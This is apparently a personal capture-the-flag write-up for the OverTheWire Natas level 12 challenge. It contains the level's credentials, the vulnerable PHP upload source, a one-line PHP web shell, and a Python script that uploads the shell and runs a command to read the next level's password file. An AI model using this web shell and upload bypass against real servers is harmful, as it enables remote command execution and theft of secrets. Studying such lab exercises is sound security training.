:PROPERTIES:
:ID:       fdd79b13-1484-46a9-a443-bd8432d7da31
:END:
#+title: Natas12
* Previous
[[id:fa870da3-03df-4ed4-8282-bf34abc24f11][Natas11]]

* Password
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

* Flag
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

* Notes

From top page:
#+begin_src html
<form enctype="multipart/form-data" action="index.php" method="POST">
  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
  <input type="hidden" name="filename" value="u374x5aq4m.jpg" />
  Choose a JPEG to upload (max 1KB):<br/>
  <input name="uploadedfile" type="file" /><br />
  <input type="submit" value="Upload File" />
</form>
#+end_src

From sourcecode page:
#+begin_src html
<?
 function genRandomString() {
   $length = 10;
   $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
   $string = "";

   for ($p = 0; $p < $length; $p++) {
     $string .= $characters[mt_rand(0, strlen($characters)-1)];
   }

   return $string;
 }


 function makeRandomPath($dir, $ext) {
   do {
     $path = $dir."/".genRandomString().".".$ext;
   } while(file_exists($path));

   return $path;
 }

 function makeRandomPathFromFilename($dir, $fn) {
   $ext = pathinfo($fn, PATHINFO_EXTENSION);
   return makeRandomPath($dir, $ext);
 }

 if(array_key_exists("filename", $_POST)) {
   $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

   if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
     echo "File is too big";
   } else {
     if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
       echo "The file
             <a href=\"$target_path\">
             $target_path
             has been uploaded";
     } else {
       echo "There was an error uploading the file, please try again!";
     }
   }
 } else {
      ?>;
      <form enctype="multipart action="index.php" form-data"="" method="POST">
       <input type="hidden" name="max_file_size" value="1000" >
       </input type="hidden" name="max_file_size" value="1000" >
       <input type="hidden" name="filename" value="<? print genrandomstring(); ?>.jpg" />
        Choose a JPEG to upload (max 1KB):
        <input name="uploadedfile" type="file" >
        </input name="uploadedfile" type="file" >
        <input type="submit" value="upload file" >
        </input type="submit" value="upload file" >
        <? } ?>
#+end_src

Top page allows us to upload files (asks for JPEG).
The uploaded file is assigned a random file name on the server.
The extension is kept as is, and the PHP `move_uploaded_file` function is not secure.
The assigned random file name is given to us after the upload.
This means we can upload arbitrary PHP files and run them.

#+begin_src php
<?php
    system($_GET['var']);
?>
#+end_src

This script simply get a value from URL passed arguments.
See [[https://www.w3schools.com/PHP/php_superglobals_get.asp][$_GET]] and [[https://www.php.net/manual/en/function.system.php][system()]]

- `filename` is taken from $_POST['filename']. This field must exist.
- The final extention of uploaded file is taken from `filename` field.
- File is moved from tmp to final dest using the random name gen. The final path is printed.
- We can then use the given path to execute command on the system : print the password located in /etc/...

#+begin_src python :results output
#!/usr/bin/env python3

import requests
import re
import html
from bs4 import BeautifulSoup as bs
from natas_pass import passwords

session = requests.Session()
username = "natas12"
password = passwords[username]

url = "http://{}.natas.labs.overthewire.org/".format(username)

# response = session.get(url, auth=(username, password))
# content = response.text
# print(content)

# response = session.get(url + "index-source.html", auth=(username, password))
# raw_content = response.text
# sourcecode = html.unescape(raw_content)
# soup = bs(sourcecode)
# print(soup.prettify())

response = requests.post(
    url,
    auth=(username, password),
    data={"filename":"xxx.php"},
    files={'uploadedfile' : open('revshell.php', 'rb')}
)
raw_content = response.text
sourcecode = html.unescape(raw_content)
soup = bs(sourcecode, features="html.parser")
# headers = response.headers
# print(headers)
# print(soup.prettify())

script_path = re.findall("(upload/[a-zA-Z0-9]{10}.php)", raw_content)[0]

if script_path :
    raw_content = requests.get(
    url+script_path+"?var=cat /etc/natas_webpass/natas13",
    auth=(username, password)
).text
else :
    print("Error. No path found.")

p = re.findall("([a-zA-Z0-9]{32})", raw_content)

if p and p[0] == password:
    p.pop(0)

if p :
    print(p[0])
#+end_src

#+RESULTS:
: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

* Next
[[id:d803954c-1f3e-4471-b741-0cb738ec73f8][Natas13]]
